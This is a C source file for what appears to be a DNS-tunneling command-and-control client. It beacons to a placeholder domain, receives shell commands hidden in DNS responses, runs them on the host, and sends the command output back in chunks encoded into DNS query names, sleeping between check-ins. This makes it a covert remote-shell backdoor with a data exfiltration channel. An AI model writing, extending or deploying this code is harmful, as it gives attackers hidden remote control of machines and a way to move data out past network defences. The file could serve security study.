#include <stdio.h>
#include <string.h> 	  	// strlen used in main here
#include "dns-protocol.h" 	// for using createDnsHeader here..
#include "bufferHelper.h"
#include "exec.h"
#include "sockets.h"
#include "dns-packet.h"
#include "linked-list.h"	// list definitions and structs

unsigned int napTime = 10;
unsigned char *defaultHost = "993479018484841";
unsigned char *defaultDomain = ".subdomain.domain.com";

void main(int argc, char *argv[])
{
	// error checking for argument order and count
	//if(argc != 2)
	//{
	//	puts("[-] Welcome to DNS client 1.0 \n");
	//	puts("[-] Usage: ./dns-client your-domain.com \n");
	//	exit(1);
	//}

	int stdoutBuffSize = 0, recvBuffSize = 0, sendBuffSize = 0, taskType = 0;
	unsigned char *recvBuff, *sendBuff, *stdoutBuff, *task;
	recvBuff = NULL;
	sendBuff = NULL;
	stdoutBuff = NULL;
	task = NULL;

	// create two linked list based queues
	struct NODE *taskQueueHead = NULL;
	struct NODE *stdoutListHead = NULL;
	struct NODE *curJob;

	// send initial query and receive response
	// encrypt, encode, createPacket, sendPacket
	sendBuff = createDnsQueryPacket(MESSAGE_TYPE_HELLO, defaultHost, defaultDomain, &sendBuffSize);
	recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);

	// create dns packet buffer
	while (1)
	{
		// parse response
		struct DNS_RESPONSE_PACKET *drp = parseDnsResponse(recvBuff, recvBuffSize);

		// disect pre-selected fields based on protocol we designed
		struct CONTROL *ctrl = getControl(drp);

		// decide what to do with response
		switch (ctrl->messageType)
		{
			/* ========================================================= */
			case MESSAGE_TYPE_NO_CMD:
				break;

			/* ========================================================= */
			case MESSAGE_TYPE_SHELL_CMD:

				// run command and add stdout to stdoutList
				stdoutBuffSize = shellCommand(ctrl->message, &stdoutBuff);
				struct NODE *tempList = constructStdoutList(stdoutBuff, stdoutBuffSize);

				// empty out stdout list query names into stdoutListHead
				while(tempList->next != NULL)
				{
					enqueue(&stdoutListHead, tempList->data, tempList->dataLength);

					// walking the tempList of stdout, storing node in 'global' sdoutListHead
					tempList = tempList->next;
				}
				// tempList has no more nodes connected or just had 1 to begin
				enqueue(&stdoutListHead, tempList->data, tempList->dataLength);
				break;
			/* ========================================================= */

			default:
				break;
		} // end switch

		// now grab next chunk of output -- no necessarily from prev cmd
		curJob = dequeue(&stdoutListHead);

		/*
		 * 1. encode
		 * 2. encrypt
		 */

		//unsigned char *host = encode(curJob->data);

		if(curJob != NULL)
		{
			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_CMD_OUTPUT,
								curJob->data,
									defaultDomain,
								     		&sendBuffSize);
		}
		else
		{
			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_HELLO,
								"hhhhhhhhhhhhhhhhi",
									defaultDomain,
										&sendBuffSize);
		}

		sleep(napTime);
		recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);

		// clear buffers
		memset(sendBuff, 0, sendBuffSize);

	} // end while
} // end main
